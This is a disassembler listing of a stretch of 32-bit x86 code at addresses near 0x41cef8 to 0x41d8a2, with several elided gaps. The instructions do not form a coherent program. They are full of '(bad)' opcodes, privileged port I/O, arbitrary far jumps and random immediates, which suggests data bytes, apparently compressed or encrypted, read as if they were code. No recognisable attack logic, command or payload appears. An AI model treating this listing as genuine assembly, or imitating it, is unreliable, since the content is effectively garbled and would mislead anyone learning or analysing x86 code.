  41cef8:	xor    DWORD PTR [eax],esp
  41cefa:	and    DWORD PTR [ebx+ecx*1],ebx
  41cefd:	test   edx,0x9a4eb5d7
  41cf03:	stc    
  41cf04:	push   ds
  41cf05:	loop   0x41cee0
  41cf07:	fst    st(6)
  41cf09:	outs   dx,BYTE PTR ds:[esi]
  41cf0a:	les    esi,FWORD PTR [edi]
  41cf0c:	ret    0xd128
  41cf0f:	outs   dx,BYTE PTR ds:[esi]
  41cf10:	adc    ebx,DWORD PTR [ebp+0x63fc8f9d]
  41cf16:	sbb    ebx,DWORD PTR es:[esi+0x73d355d1]
  41cf1d:	js     0x41cf39
  41cf1f:	in     eax,dx
  41cf20:	fcmovnb st,st(0)
  41cf22:	jnp    0x41cf2c
  41cf24:	and    eax,0x85fee8c2
  41cf29:	dec    DWORD PTR [esi+esi*8]
  41cf2c:	lods   al,BYTE PTR ds:[esi]
  41cf2d:	inc    edx
  41cf2e:	mov    dh,0x50
  41cf30:	pushf  
  41cf31:	aam    0xbb
  41cf33:	addr16 or eax,0xbd508610
  41cf39:	les    eax,FWORD PTR [edx-0x52e5b298]
  41cf3f:	shr    BYTE PTR [ebx*4+0x6e2b4837],1
  41cf46:	cwde   
  41cf47:	idiv   DWORD PTR [esi+0x23]
  41cf4a:	lods   eax,DWORD PTR ds:[esi]
  41cf4b:	fs sahf 
  41cf4d:	int3   
  41cf4e:	xchg   esp,eax
  41cf4f:	jmp    0x41cf9c
  41cf51:	in     al,0x2
  41cf53:	dec    ebp
  41cf54:	push   edi
  41cf55:	pushf  
  41cf56:	and    DWORD PTR [edi-0x1d],ebp
  41cf59:	inc    esp
  41cf5a:	jo     0x41cf79
  41cf5c:	pusha  
  41cf5d:	add    DWORD PTR [esi],esi
  41cf5f:	(bad)  
  41cf60:	neg    BYTE PTR [edx]
  41cf62:	in     eax,dx
  41cf63:	dec    edi
  41cf64:	xor    dl,BYTE PTR gs:[ebx+edx*4+0x43]
  41cf69:	xchg   ebx,eax
  41cf6a:	or     bl,BYTE PTR [esi]
  41cf6c:	daa    
  41cf6d:	xchg   esi,eax
  41cf6e:	pop    ebx
  41cf6f:	push   0x6
  41cf71:	jle    0x41cefc
  41cf73:	xchg   ebp,eax
  41cf74:	xor    esp,DWORD PTR es:[ecx]
  41cf77:	xor    ah,BYTE PTR [esi-0x789027e6]
  41cf7d:	and    esi,DWORD PTR [ebp-0x6e]
  41cf80:	jecxz  0x41cf11
  41cf82:	pop    ecx
  41cf83:	in     eax,0xae
  41cf85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf86:	mov    edx,0xcf87eeed
  41cf8b:	test   DWORD PTR [edx],esi
  41cf8d:	xchg   DWORD PTR [ebx-0x14897162],esi
  41cf93:	mov    eax,ds:0x301001dc
  41cf98:	(bad)  
  41cf99:	shr    DWORD PTR [ebx+0x2103e6a0],1
  41cf9f:	cs outs dx,DWORD PTR cs:[esi]
  41cfa2:	or     bh,ah
  41cfa4:	xchg   esi,eax
  41cfa5:	sub    bl,dh
  41cfa7:	jecxz  0x41cf35
  41cfa9:	mov    esi,0x19d5aad0
  41cfae:	sub    BYTE PTR [ebp+0x5eb0d8d4],0x9f
	...
  41d015:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d01b:	push   edi
  41d01c:	sti    
  41d01d:	(bad)  
  41d01e:	das    
  41d01f:	ret    
  41d020:	lods   al,BYTE PTR ds:[esi]
  41d021:	daa    
  41d022:	mov    edi,0x94bbcb64
  41d027:	xor    al,BYTE PTR [ecx]
  41d029:	add    BYTE PTR [edi],al
  41d02b:	add    DWORD PTR [eax],eax
  41d02d:	add    BYTE PTR [edi+0x27],ah
  41d030:	into   
  41d031:	sbb    edx,DWORD PTR [edi+eax*1-0x47]
  41d035:	xor    esp,DWORD PTR [eax+0x38]
  41d038:	pop    ecx
  41d039:	or     BYTE PTR [ecx-0x12214a74],cl
  41d03f:	js     0x41d08d
  41d041:	js     0x41d07a
  41d043:	cmp    dh,BYTE PTR [esi+0x6c03396f]
  41d049:	pop    es
  41d04a:	ins    DWORD PTR es:[edi],dx
  41d04b:	aam    0x45
  41d04d:	es dec ebp
  41d04f:	xchg   ecx,eax
  41d050:	out    0x15,eax
  41d052:	leave  
  41d053:	imul   eax,DWORD PTR [esi-0x42dba4bd],0x4d4c6d62
  41d05d:	mov    cl,0x8a
  41d05f:	xchg   edx,eax
  41d060:	mov    edx,0x5f2040d0
  41d065:	mov    ebx,0x9651f6b6
  41d06a:	or     bh,BYTE PTR ds:0x7fd0634b
  41d070:	push   ebp
  41d071:	lods   eax,DWORD PTR ds:[esi]
  41d072:	mov    bl,0xfa
  41d074:	outs   dx,BYTE PTR ds:[esi]
  41d075:	inc    edi
  41d076:	push   es
  41d077:	cwde   
  41d078:	xchg   esp,eax
  41d079:	call   0x8e6a058e
  41d07e:	add    eax,0x818e225c
  41d083:	ins    DWORD PTR es:[edi],dx
  41d084:	mov    BYTE PTR [edi-0x68],ah
  41d087:	sbb    esp,DWORD PTR [ecx]
  41d089:	mov    BYTE PTR [edi+0x44],ah
  41d08c:	inc    esi
  41d08d:	add    BYTE PTR [edi-0x68628047],0x8
  41d094:	mov    eax,ds:0xd252aaca
  41d099:	fs (bad) 
  41d09b:	or     ch,BYTE PTR [edi+0x67]
  41d09e:	stc    
  41d09f:	sub    eax,0x83036146
  41d0a4:	sti    
  41d0a5:	xchg   edx,eax
  41d0a6:	and    ebp,ebx
  41d0a8:	imul   edx,esi,0x38
  41d0ab:	add    cl,dl
  41d0ad:	pop    esi
  41d0ae:	sub    ebp,DWORD PTR [edi+0x70]
  41d0b1:	stos   DWORD PTR es:[edi],eax
  41d0b2:	xor    eax,0x990a7825
  41d0b7:	inc    eax
  41d0b8:	ret    0xe60e
  41d0bb:	inc    ebx
  41d0bc:	xor    DWORD PTR [eax+0x1b0137b0],edi
  41d0c2:	imul   ebp,DWORD PTR [edx],0xffffff87
  41d0c5:	pop    ebx
  41d0c6:	fwait
  41d0c7:	xor    eax,0x58d3ed1d
  41d0cc:	mov    ecx,0x738f5e1d
  41d0d1:	xchg   edx,eax
  41d0d2:	lods   eax,DWORD PTR ds:[esi]
  41d0d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0d4:	push   esp
  41d0d5:	push   ds
  41d0d6:	dec    ebp
  41d0d7:	add    ch,0x39
  41d0da:	jge    0x41d106
  41d0dc:	in     eax,0xc4
  41d0de:	les    ebx,FWORD PTR [ebx-0x42]
  41d0e1:	fsubrp st(6),st
  41d0e3:	dec    edi
  41d0e4:	jnp    0x41d13e
  41d0e6:	ins    BYTE PTR es:[edi],dx
  41d0e7:	in     eax,dx
  41d0e8:	push   esp
  41d0e9:	sti    
  41d0ea:	into   
  41d0eb:	mov    eax,0x2ea06f68
  41d0f0:	iret   
  41d0f1:	popf   
  41d0f2:	cld    
  41d0f3:	call   0xec96:0xa466662c
  41d0fa:	in     eax,0xf7
  41d0fc:	aad    0x25
  41d0fe:	cwde   
  41d0ff:	adc    al,0x33
  41d101:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d103:	(bad)  
  41d104:	push   edx
  41d105:	mov    ds:0x5e22a852,al
  41d10a:	mov    ds:0x253adf82,eax
  41d10f:	mov    ds:0x4262c848,al
  41d114:	call   DWORD PTR [ebx-0x60]
  41d117:	repnz mov esi,DWORD PTR [edi]
  41d11a:	sbb    eax,0x36ea389e
  41d11f:	push   ecx
  41d120:	jne    0x41d0a5
  41d122:	push   es
  41d123:	add    DWORD PTR [ecx],edx
  41d125:	push   es
  41d126:	(bad)  
  41d127:	rcl    BYTE PTR [edx-0x2348d52d],0xdf
  41d12e:	sbb    al,bh
  41d130:	jp     0x41d149
  41d132:	rol    DWORD PTR [eax+0x16],cl
	...
  41d194:	add    BYTE PTR [eax],al
  41d196:	push   eax
  41d197:	ret    
  41d198:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d19e:	sti    
  41d19f:	aad    0x81
  41d1a1:	loopne 0x41d21e
  41d1a3:	cmp    esp,0x1339b1b
  41d1a9:	add    BYTE PTR [edi],al
  41d1ab:	add    DWORD PTR [eax],eax
  41d1ad:	add    BYTE PTR [ecx],cl
  41d1af:	test   eax,0xc2b37818
  41d1b4:	pop    ds
  41d1b5:	adc    DWORD PTR [eax-0x1b],ebp
  41d1b8:	push   ss
  41d1b9:	mov    BYTE PTR [esi+0x7f],0xf5
  41d1bd:	adc    esp,DWORD PTR [ecx]
  41d1bf:	in     al,0x9a
  41d1c1:	mov    cl,0xe7
  41d1c3:	xor    al,0xe3
  41d1c5:	sub    ecx,esi
  41d1c7:	ja     0x41d14b
  41d1c9:	sbb    DWORD PTR [ebx+eiz*8],edx
  41d1cc:	cwde   
  41d1cd:	cmp    DWORD PTR [edx+0x42],edi
  41d1d0:	xor    eax,0x6948707c
  41d1d5:	add    dl,BYTE PTR [ebp-0x708532c5]
  41d1db:	push   edi
  41d1dc:	cmp    ebx,DWORD PTR [ecx+esi*8+0x628f6110]
  41d1e3:	cmp    ebx,DWORD PTR [eax]
  41d1e5:	dec    ecx
  41d1e6:	call   0x48423d8d
  41d1eb:	test   DWORD PTR [edx],esp
  41d1ed:	jmp    0xcd6e:0x603fb60
  41d1f4:	(bad)  
  41d1f5:	aas    
  41d1f6:	pextrw ebp,mm7,0xf0
  41d1fa:	cwde   
  41d1fb:	jmp    0xfbe3:0xba53b380
  41d202:	add    edi,DWORD PTR [ebp+0x14]
  41d205:	loop   0x41d225
  41d207:	jnp    0x41d19c
  41d209:	(bad)  
  41d20a:	sbb    ebx,esp
  41d20c:	cs or  al,0x81
  41d20f:	xor    al,0x63
  41d211:	call   0x29bdcd74
  41d216:	(bad)  
  41d217:	iret   
  41d218:	test   al,0x61
  41d21a:	inc    eax
  41d21b:	pop    ebx
  41d21c:	repz js 0x41d207
  41d21f:	xchg   DWORD PTR [ebp-0x1f7dffdc],ebx
  41d225:	test   DWORD PTR [esi-0x38],esp
  41d228:	jnp    0x41d218
  41d22a:	sbb    BYTE PTR [ebp+0x6a],0x68
  41d22e:	push   ebx
  41d22f:	cmp    edx,DWORD PTR [eax]
  41d231:	adc    al,BYTE PTR [edi-0x66]
  41d234:	or     eax,0x2a362b97
  41d239:	xor    DWORD PTR ds:0x523f1fe6,0x33
  41d240:	sbb    edi,DWORD PTR [eax+0x60]
  41d243:	(bad)  
  41d244:	xlat   BYTE PTR ds:[ebx]
  41d245:	dec    eax
  41d246:	or     al,0x13
  41d248:	in     al,0xa2
  41d24a:	les    esi,FWORD PTR [ebx]
  41d24c:	out    0xb1,al
  41d24e:	cld    
  41d24f:	pop    ecx
  41d250:	adc    BYTE PTR ds:0xa0ac858a,0xd1
  41d257:	(bad)  
  41d258:	hlt    
  41d259:	and    DWORD PTR [edi-0x5114269b],eax
  41d25f:	cmp    eax,0xb68414f9
  41d264:	fisttp DWORD PTR [eax-0x6f90f326]
  41d26a:	sub    dl,dl
  41d26c:	dec    esp
  41d26d:	iret   
  41d26e:	mov    esi,0x7f3c9ede
  41d273:	jae    0x41d23f
  41d275:	add    eax,DWORD PTR [edi-0x13]
  41d278:	fsubr  DWORD PTR [eax+0x3c25f288]
  41d27e:	pop    ecx
  41d27f:	clc    
  41d280:	repz (bad) 
  41d283:	adc    cl,dl
  41d285:	and    BYTE PTR [eax+0x2f070b09],ah
  41d28b:	shr    BYTE PTR [esp+ecx*4-0x77178ba3],1
  41d292:	xor    ebp,DWORD PTR [esi]
  41d294:	sub    bl,cl
  41d296:	iret   
  41d297:	std    
  41d298:	jl     0x41d2e2
  41d29a:	test   eax,0xd345a7ba
  41d29f:	xor    BYTE PTR [ecx-0x1c52c473],ah
  41d2a5:	mov    al,0x7c
  41d2a7:	(bad)  
  41d2a8:	push   esi
  41d2a9:	shl    DWORD PTR [esp+ebx*8-0x3ee556b0],0x68
  41d2b1:	iret   
  41d2b2:	xchg   ebx,eax
  41d2b3:	mov    cl,0xc8
	...
  41d315:	add    dh,bh
  41d317:	cmp    cl,0x54
  41d31a:	(bad)  
  41d31b:	jge    0x41d31c
  41d31d:	stos   BYTE PTR es:[edi],al
  41d31e:	sbb    BYTE PTR [ebx-0x1db27a82],ch
  41d324:	add    bl,BYTE PTR [edi+0x134a2]
  41d32a:	pop    es
  41d32b:	add    DWORD PTR [eax],eax
  41d32d:	add    BYTE PTR [ebx-0x4b],dh
  41d330:	dec    BYTE PTR [eax-0x3]
  41d333:	sbb    bl,BYTE PTR [eax-0x16]
  41d336:	xchg   ebx,eax
  41d337:	std    
  41d338:	idiv   dl
  41d33a:	(bad)  
  41d33c:	jbe    0x41d335
  41d33e:	jns    0x41d39f
  41d340:	aaa    
  41d341:	jmp    0x41d37a
  41d343:	add    BYTE PTR [ebp-0x354b0423],0x9e
  41d34a:	ret    0xe0ad
  41d34d:	mov    dh,0x72
  41d34f:	mov    DWORD PTR [edi-0x1680c831],eax
  41d355:	inc    ebx
  41d356:	jle    0x41d39d
  41d358:	push   ebp
  41d359:	mov    ds:0x47a27c30,eax
  41d35e:	jge    0x41d364
  41d360:	dec    esi
  41d361:	inc    ebp
  41d362:	mov    ah,0x8e
  41d364:	call   FWORD PTR [edx]
  41d366:	nop
  41d367:	mov    DWORD PTR ds:[esi+0x5ab644a9],edi
  41d36e:	(bad)  
  41d36f:	mov    sp,0x2b07
  41d373:	push   ecx
  41d374:	sbb    eax,0x8dcce9db
  41d379:	test   al,0xaf
  41d37b:	mov    al,0xed
  41d37d:	jg     0x41d3c5
  41d37f:	dec    edi
  41d380:	adc    ah,al
  41d382:	(bad)  
  41d383:	stc    
  41d384:	jnp    0x41d362
  41d386:	xor    ebp,DWORD PTR [edx+0x44b64e7a]
  41d38c:	enter  0xbe82,0x53
  41d390:	repnz inc ebx
  41d392:	jo     0x41d368
  41d394:	add    al,0x95
  41d396:	mov    bh,0x4
  41d398:	pop    ebp
  41d399:	leave  
  41d39a:	loop   0x41d40d
  41d39c:	dec    esi
  41d39d:	mov    esi,0x8871e14e
  41d3a2:	jbe    0x41d3a0
  41d3a4:	push   ds
  41d3a5:	dec    edx
  41d3a6:	push   es
  41d3a7:	neg    DWORD PTR [eax-0x114788ca]
  41d3ad:	or     cl,BYTE PTR [edi-0x32fca1a6]
  41d3b3:	xchg   edx,eax
  41d3b4:	adc    al,0x78
  41d3b6:	jge    0x41d40f
  41d3b8:	mov    eax,0x3316a183
  41d3bd:	add    eax,0x85462957
  41d3c2:	out    dx,al
  41d3c3:	mov    dh,0xaa
  41d3c5:	sbb    dh,BYTE PTR [ebx+eax*8-0x24ee938d]
  41d3cc:	int    0x48
  41d3ce:	adc    DWORD PTR [edi+0x8501d3a],esi
  41d3d4:	push   0x17
  41d3d6:	pop    ds
  41d3d7:	add    dh,BYTE PTR [esi-0x32143e79]
  41d3dd:	pop    ebx
  41d3de:	sub    ebp,ecx
  41d3e0:	imul   ecx,DWORD PTR [ebp-0x5a],0x79
  41d3e4:	punpckldq mm1,DWORD PTR [ecx-0x63d64552]
  41d3eb:	pop    ss
  41d3ec:	(bad)  
  41d3ed:	in     eax,0x81
  41d3ef:	sub    eax,0xa3ce5a45
  41d3f4:	stc    
  41d3f5:	in     al,dx
  41d3f6:	icebp  
  41d3f7:	(bad)  
  41d3f8:	cld    
  41d3f9:	test   BYTE PTR [esi],dl
  41d3fb:	fwait
  41d3fc:	sbb    DWORD PTR [eax+0x7a169491],0xb90b4b0
  41d406:	xchg   edx,eax
  41d407:	adc    dl,cl
  41d409:	push   es
  41d40a:	ret    
  41d40b:	and    BYTE PTR gs:[ebp-0x5a],dl
  41d40f:	push   ebx
  41d410:	inc    edx
  41d411:	fs ret 0xcee6
  41d415:	retf   0x7aa
  41d418:	call   DWORD PTR [ebx+eax*8]
  41d41b:	and    DWORD PTR [ebx+0x27b9710b],eax
  41d421:	sub    al,BYTE PTR [edx]
  41d423:	xchg   ebp,eax
  41d424:	dec    esp
  41d425:	shr    DWORD PTR [edi+0x7b],0xa4
  41d429:	mov    ebx,0x5dbd26a7
  41d42e:	loop   0x41d3e3
  41d430:	mov    ebx,0x19077273
	...
  41d495:	add    dh,dh
  41d497:	rcl    BYTE PTR ss:[edx+edx*8-0x2e89090c],cl
  41d49f:	fwait
  41d4a0:	aad    0xa2
  41d4a2:	das    
  41d4a3:	(bad)  
  41d4a4:	jmp    0x1777ea4
  41d4a9:	add    BYTE PTR [edi],al
  41d4ab:	add    DWORD PTR [eax],eax
  41d4ad:	add    BYTE PTR [edi],al
  41d4af:	cli    
  41d4b0:	mov    al,0x5e
  41d4b2:	leave  
  41d4b3:	inc    ebx
  41d4b4:	fild   WORD PTR [ebx-0x1e]
  41d4b7:	ja     0x41d481
  41d4b9:	outs   dx,BYTE PTR ds:[esi]
  41d4ba:	pop    eax
  41d4bb:	add    eax,0xce9c12ef
  41d4c0:	jg     0x41d4c0
  41d4c2:	xchg   ebp,eax
  41d4c3:	or     eax,0x9789d5ef
  41d4c8:	and    ecx,ebp
  41d4ca:	clc    
  41d4cb:	out    dx,eax
  41d4cc:	jne    0x41d4fe
  41d4ce:	push   ds
  41d4cf:	jl     0x41d529
  41d4d1:	cmp    al,0x53
  41d4d3:	sub    ch,0x95
  41d4d6:	mov    edx,0x705d34e9
  41d4db:	jmp    0x41d4ad
  41d4dd:	lods   al,BYTE PTR ds:[esi]
  41d4de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4df:	xchg   ebp,eax
  41d4e0:	push   eax
  41d4e1:	loopne 0x41d4e8
  41d4e3:	repz sub dh,cl
  41d4e6:	addr16 icebp 
  41d4e8:	mov    ds:0x52160208,al
  41d4ed:	(bad)  
  41d4ef:	or     cl,BYTE PTR [esi-0x7b]
  41d4f2:	loop   0x41d4c3
  41d4f4:	loope  0x41d568
  41d4f6:	setl   BYTE PTR [eax-0xd]
  41d4fa:	jp     0x41d4b3
  41d4fc:	sbb    esp,ebx
  41d4fe:	cmp    DWORD PTR [ebx],ebx
  41d500:	mov    dh,0xc6
  41d502:	jmp    0x41d544
  41d504:	pusha  
  41d505:	cmp    ah,bl
  41d507:	fnstsw WORD PTR [edi]
  41d509:	and    al,BYTE PTR [esi+ebp*1]
  41d50c:	shl    DWORD PTR [edx+0x3a],1
  41d50f:	jbe    0x41d4a3
  41d511:	(bad)  
  41d512:	shr    DWORD PTR [ebx+0x2a],1
  41d515:	mov    dl,BYTE PTR [esi]
  41d517:	popa   
  41d518:	(bad)  
  41d519:	mov    esi,0x9f30ce3b
  41d51e:	jno    0x41d540
  41d520:	inc    eax
  41d521:	test   BYTE PTR [ebx+edi*4-0x62],ch
  41d525:	mov    eax,0x9073fd25
  41d52a:	mov    bh,0x9a
  41d52c:	jo     0x41d526
  41d52e:	out    0xa6,eax
  41d530:	ror    BYTE PTR [edi],cl
  41d532:	jbe    0x41d4eb
  41d534:	jb     0x41d54e
  41d536:	ds jmp 0xb10bcddd
  41d53c:	xchg   esp,eax
  41d53d:	or     al,0x17
  41d53f:	and    eax,0xf6f012d7
  41d544:	xor    ebp,DWORD PTR [ebx+0x652690de]
  41d54a:	call   0xff280920
  41d54f:	mov    ds:0x226e38a7,al
  41d554:	xor    cl,bl
  41d556:	mov    esp,0xa81ffda3
  41d55b:	fst    QWORD PTR [edx-0x8]
  41d55e:	cmp    eax,0x38161304
  41d563:	fnsave [edx+0x6a]
  41d566:	icebp  
  41d567:	rol    esi,1
  41d569:	push   ebx
  41d56a:	(bad)
  41d56d:	push   esp
  41d56e:	adc    dl,cl
  41d570:	xor    al,cl
  41d572:	jno    0x41d59d
  41d574:	test   DWORD PTR [ecx],edx
  41d576:	xlat   BYTE PTR ds:[ebx]
  41d577:	ins    DWORD PTR es:[edi],dx
  41d578:	mov    DWORD PTR [eax],ecx
  41d57a:	ret    
  41d57b:	mov    al,0x5e
  41d57d:	dec    DWORD PTR [eax]
  41d57f:	or     edi,DWORD PTR [ebp-0x3b9b5812]
  41d585:	push   ds
  41d586:	out    0x3d,al
  41d588:	sbb    DWORD PTR [esi],edx
  41d58a:	test   DWORD PTR [ecx+0x6e],ecx
  41d58d:	aad    0x60
  41d58f:	(bad)  
  41d590:	push   ds
  41d591:	push   cs
  41d592:	jp     0x41d5e4
  41d594:	jbe    0x41d565
  41d596:	call   0x52af:0x7c2c94f3
  41d59d:	pop    es
  41d59e:	mov    edi,0xeed94987
  41d5a3:	sbb    BYTE PTR [ecx-0xc],bl
  41d5a6:	lea    eax,[edi+0x32]
  41d5a9:	xchg   esp,eax
  41d5aa:	call   0xda62:0x9b494902
  41d5b1:	cli    
  41d5b2:	enter  0xe7d9,0x0
	...
  41d616:	jl     0x41d5b1
  41d618:	dec    esp
  41d619:	jbe    0x41d608
  41d61b:	idiv   DWORD PTR [esi-0x65]
  41d61e:	mov    al,BYTE PTR [edi-0xdd42ddf]
  41d624:	and    DWORD PTR [eax+esi*4+0x7000136],0x1
  41d62c:	add    BYTE PTR [eax],al
  41d62e:	and    DWORD PTR [eax],ebp
  41d630:	fstp   DWORD PTR [esi-0x7d524d01]
  41d636:	xchg   ebp,eax
  41d637:	(bad)  
  41d638:	jp     0x41d5bb
  41d63a:	and    eax,0x68ac745f
  41d63f:	lods   al,BYTE PTR ds:[esi]
  41d640:	sbb    al,bl
  41d642:	push   edi
  41d643:	sub    ecx,DWORD PTR [edi]
  41d645:	and    BYTE PTR [ebp-0x3d],bh
  41d648:	dec    ebx
  41d649:	xchg   edx,eax
  41d64a:	(bad)  [edx]
  41d64c:	(bad)  
  41d64d:	addr16 pop esp
  41d64f:	jp     0x41d64a
  41d651:	or     BYTE PTR [eax-0xe],al
  41d654:	or     edi,DWORD PTR [esi+0x58144e80]
  41d65a:	sub    al,BYTE PTR [ebx]
  41d65c:	lds    ebx,FWORD PTR [ebp+0x607e413]
  41d662:	retf   0x45c7
  41d665:	xor    eax,0x3aae3bcd
  41d66a:	scas   al,BYTE PTR es:[edi]
  41d66b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d66c:	bound  ebp,QWORD PTR [eax-0x56]
  41d66f:	ins    DWORD PTR es:[edi],dx
  41d670:	imul   esp,DWORD PTR [edi+0x3c],0x9587bfa2
  41d677:	retf   0x7ef6
  41d67a:	out    0xc8,eax
  41d67c:	and    bh,bl
  41d67e:	in     al,0xfc
  41d680:	adc    BYTE PTR [edi-0x33],ch
  41d683:	add    DWORD PTR [edi],0x6
  41d686:	add    al,0xae
  41d688:	push   0xfffffff2
  41d68a:	stos   BYTE PTR es:[edi],al
  41d68b:	(bad)  
  41d68c:	ds sbb eax,0x3cbe7c
  41d692:	xchg   esi,eax
  41d693:	in     eax,dx
  41d694:	adc    esi,ebp
  41d696:	sbb    eax,0x2c48d239
  41d69b:	int3   
  41d69c:	fidivr WORD PTR ds:0xb3c87d4b
  41d6a2:	sub    dl,ch
  41d6a4:	push   edi
  41d6a5:	cmp    bl,bh
  41d6a7:	sbb    BYTE PTR [ebp-0x38],bl
  41d6aa:	sub    cl,BYTE PTR [edi]
  41d6ac:	enter  0x75cf,0xa0
  41d6b0:	jmp    0x74a0:0x75186728
  41d6b7:	(bad)  
  41d6b8:	bound  ebp,QWORD PTR [ebp+0x68]
  41d6bb:	fldcw  WORD PTR [ebp-0x7181181]
  41d6c1:	xor    edi,ebp
  41d6c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6c4:	sbb    BYTE PTR [ebx],ah
  41d6c6:	inc    edx
  41d6c7:	add    al,0x70
  41d6c9:	sub    al,0x9b
  41d6cb:	and    bl,BYTE PTR [edx]
  41d6cd:	lds    eax,FWORD PTR [esp+edx*8+0x5c]
  41d6d1:	adc    bh,BYTE PTR [ecx]
  41d6d3:	std    
  41d6d4:	std    
  41d6d5:	xor    BYTE PTR [ebp+esi*8-0x51],ah
  41d6d9:	je     0x41d6d7
  41d6db:	and    BYTE PTR [ecx],ch
  41d6dd:	mov    esi,0x1f9c9d2c
  41d6e2:	pop    ebp
  41d6e3:	xchg   esp,eax
  41d6e4:	loop   0x41d697
  41d6e6:	pop    ss
  41d6e7:	or     bh,ah
  41d6e9:	cmp    BYTE PTR [edx+0x4d],ah
  41d6ec:	stos   BYTE PTR es:[edi],al
  41d6ed:	inc    ecx
  41d6ee:	jecxz  0x41d6ea
  41d6f0:	add    ah,ah
  41d6f2:	mov    dl,0x54
  41d6f4:	mov    al,BYTE PTR [esi+0x18776dce]
  41d6fa:	call   0x7132:0x332f04b1
  41d701:	sub    eax,0x687c29c4
  41d706:	sub    ebx,DWORD PTR [edx]
  41d708:	jp     0x41d6ea
  41d70a:	pushf  
  41d70b:	mov    al,ds:0x318442b2
  41d710:	(bad)  
  41d711:	push   cs
  41d712:	xlat   BYTE PTR ds:[ebx]
  41d713:	rol    DWORD PTR [esi+edi*2-0x1e],cl
  41d717:	mov    dl,0x4e
  41d719:	jmp    0x41d6b0
  41d71b:	push   ebx
  41d71c:	push   ebx
  41d71d:	xor    ebp,DWORD PTR [edi+0x2a]
  41d720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d721:	inc    ebp
  41d722:	xchg   edi,eax
  41d723:	je     0x41d703
  41d725:	out    dx,al
  41d726:	(bad)  [ecx-0x73]
  41d729:	inc    eax
  41d72a:	imul   ebp,DWORD PTR ss:0xbf4854be,0xffffffb5
  41d732:	shl    BYTE PTR [edi],cl
  41d734:	push   ebp
	...
  41d795:	add    BYTE PTR [esi+ecx*8],ah
  41d798:	outs   dx,BYTE PTR ds:[esi]
  41d799:	sub    ch,dh
  41d79b:	stos   BYTE PTR es:[edi],al
  41d79c:	fs into 
  41d79e:	push   ecx
  41d79f:	pop    ebp
  41d7a0:	or     esp,edi
  41d7a2:	shl    DWORD PTR [edx+0x37b75379],1
  41d7a8:	add    DWORD PTR [eax],eax
  41d7aa:	pop    es
  41d7ab:	add    DWORD PTR [eax],eax
  41d7ad:	add    BYTE PTR [esi+0x8ec46f],al
  41d7b3:	dec    esp
  41d7b4:	test   DWORD PTR [edi],edi
  41d7b6:	mov    eax,0xa0a73ea6
  41d7bb:	bound  ecx,QWORD PTR [ebp+0x5c]
  41d7be:	jb     0x41d790
  41d7c0:	ja     0x41d77b
  41d7c2:	shl    BYTE PTR [ebp-0x12],cl
  41d7c5:	mov    ds:0x60835d25,eax
  41d7ca:	inc    edi
  41d7cb:	(bad)
  41d7d0:	aaa    
  41d7d1:	nop
  41d7d2:	xchg   DWORD PTR [edx-0x79],esi
  41d7d5:	scas   eax,DWORD PTR es:[edi]
  41d7d6:	adc    ch,bl
  41d7d8:	sub    cl,BYTE PTR [edx*8-0x621805e9]
  41d7df:	test   ebp,esi
  41d7e1:	adc    al,0x84
  41d7e3:	xchg   esi,eax
  41d7e4:	pmulhw mm3,QWORD PTR [ebx-0x60]
  41d7e8:	mov    ah,BYTE PTR [ebx+eiz*2+0x526f6567]
  41d7ef:	dec    ebx
  41d7f0:	iret   
  41d7f1:	mov    al,0xae
  41d7f3:	sbb    ebx,ebp
  41d7f5:	scas   eax,DWORD PTR es:[edi]
  41d7f6:	pop    eax
  41d7f7:	mov    ch,0x8c
  41d7f9:	pop    ecx
  41d7fa:	inc    edi
  41d7fb:	and    cl,BYTE PTR [edi+0x2564a717]
  41d801:	jl     0x41d7da
  41d803:	pop    eax
  41d804:	pop    edx
  41d805:	popf   
  41d806:	fwait
  41d807:	(bad)  
  41d808:	(bad)  
  41d809:	and    BYTE PTR [ebp+0x4a2d48cb],bl
  41d80f:	jns    0x41d796
  41d811:	jne    0x41d7bf
  41d813:	sub    eax,0xefca8753
  41d818:	mov    ah,0x50
  41d81a:	fisub  WORD PTR [eax]
  41d81c:	call   0x67400aec
  41d821:	or     bh,BYTE PTR [ebx-0x6be53bd6]
  41d827:	pcmpeqd mm6,QWORD PTR [esi-0x50]
  41d82b:	aas    
  41d82c:	mov    dl,0xe8
  41d82e:	push   eax
  41d82f:	es stos DWORD PTR es:[edi],eax
  41d831:	jg     0x41d7f1
  41d833:	push   esp
  41d834:	(bad)  
  41d836:	and    esp,DWORD PTR [edx]
  41d838:	fistp  DWORD PTR [eax+edx*4+0x16]
  41d83c:	mov    bl,0x91
  41d83e:	inc    edi
  41d83f:	jne    0x41d85a
  41d841:	mov    eax,ds:0x25d73a38
  41d846:	xor    al,0x8f
  41d848:	packssdw mm0,QWORD PTR [edx]
  41d84b:	cmp    esp,ebp
  41d84d:	add    eax,0x772fe64c
  41d853:	cmp    dl,0x68
  41d856:	je     0x41d81c
  41d858:	cmp    dl,dl
  41d85a:	rcr    BYTE PTR [ecx+0x24],cl
  41d85d:	adc    dh,BYTE PTR [edx+0x37]
  41d860:	jle    0x41d8c5
  41d862:	ss dec esp
  41d864:	loopne 0x41d80b
  41d866:	push   es
  41d867:	loopne 0x41d831
  41d869:	or     bl,BYTE PTR [edi+0x5]
  41d86c:	rcr    DWORD PTR [ebx-0x1e414ece],0x43
  41d873:	adc    dh,BYTE PTR [ebx+0x5be035fe]
  41d879:	scas   al,BYTE PTR es:[edi]
  41d87a:	shl    DWORD PTR [edi+0x69],cl
  41d87d:	cmp    eax,0x209672a0
  41d882:	xchg   DWORD PTR [ebx+0x1a15fa66],ebp
  41d888:	adc    esp,DWORD PTR [edi]
  41d88a:	pop    ecx
  41d88b:	lds    ebp,FWORD PTR [ebx-0x1d]
  41d88e:	cmp    al,ch
  41d890:	pop    ecx
  41d891:	in     eax,0xbc
  41d893:	mov    ds:0xe21621f0,eax
  41d898:	mov    cl,BYTE PTR [ecx-0x6e2e1427]
  41d89e:	aam    0x5
  41d8a0:	pop    ebp
  41d8a1:	into   
  41d8a2:	mov    ds:0x3fd24e47,al
